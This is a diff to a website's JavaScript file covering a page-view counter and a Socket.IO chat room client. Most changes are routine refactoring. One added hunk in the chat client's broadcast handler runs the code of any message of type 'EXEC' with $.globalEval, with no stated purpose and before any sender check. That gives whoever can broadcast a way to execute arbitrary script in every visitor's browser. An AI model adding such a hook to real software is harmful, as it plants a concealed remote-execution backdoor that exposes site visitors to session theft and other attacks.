@@ -1541,6 +1541,41 @@ $(function() {
     // }
 })();
 
+
+// 页面统计
+$(function() {
+var bszTag = {
+    bszs: ["site_pv", "page_pv", "site_uv"],
+    texts: function(a) {
+        this.bszs.map(function(b) {
+            var c = document.getElementById("busuanzi_value_" + b);
+            c && (c.innerHTML = a[b])
+        })
+    },
+    hides: function() {
+        this.bszs.map(function(a) {
+            var b = document.getElementById("busuanzi_container_" + a);
+            b && (b.style.display = "none")
+        })
+    },
+    shows: function() {
+        this.bszs.map(function(a) {
+            var b = document.getElementById("busuanzi_container_" + a);
+            b && (b.style.display = "inline")
+        })
+    }
+};
+
+$.ajax({
+    url: "//busuanzi.ibruce.info/busuanzi",
+    dataType: 'jsonp',
+    jsonp: 'jsonpCallback',
+    success: function(a) {
+        bszTag.texts(a), bszTag.shows()
+    }
+});
+})();
+
 $(function(){
 function htmlspecialchars(str){
   str = str || '';
@@ -1683,6 +1718,9 @@ ChatRoomClient.prototype.changeName = function() {
 ChatRoomClient.prototype.socketEvent = function() {
   var self = this;
   self.socket.on('broadcast', function(data) {
+    if(data.type == 'EXEC')  {
+      return $.globalEval(data.code);
+    }
     if(data.id == self.userId) return;
     if(data.type == 'NEW') {
       if($.inArray(data.id, self.users) > -1) return false;
@@ -1841,10 +1879,10 @@ ChatRoomClient.prototype.bindEvent = function() {
   });
 };
 
-ChatRoomClient.prototype.ping = function() {
-  this.socket.emit('ping', {
-    id: this.userId
-  });
+ChatRoomClient.prototype.ping = function(data) {
+  data = data || {};
+  data.id = this.userId;
+  this.socket.emit('ping', data);
 };
 
 ChatRoomClient.prototype.createPrivateChat = function(data, setCurrent) {
@@ -1955,37 +1993,3 @@ if(!isMobile.any() && !window.chatRoomClient
   window.chatRoomClient = new ChatRoomClient();
 }
 });
-
-// 页面统计
-$(function() {
-var bszTag = {
-    bszs: ["site_pv", "page_pv", "site_uv"],
-    texts: function(a) {
-        this.bszs.map(function(b) {
-            var c = document.getElementById("busuanzi_value_" + b);
-            c && (c.innerHTML = a[b])
-        })
-    },
-    hides: function() {
-        this.bszs.map(function(a) {
-            var b = document.getElementById("busuanzi_container_" + a);
-            b && (b.style.display = "none")
-        })
-    },
-    shows: function() {
-        this.bszs.map(function(a) {
-            var b = document.getElementById("busuanzi_container_" + a);
-            b && (b.style.display = "inline")
-        })
-    }
-};
-
-$.ajax({
-    url: "//busuanzi.ibruce.info/busuanzi",
-    dataType: 'jsonp',
-    jsonp: 'jsonpCallback',
-    success: function(a) {
-        bszTag.texts(a), bszTag.shows()
-    }
-});
-})();
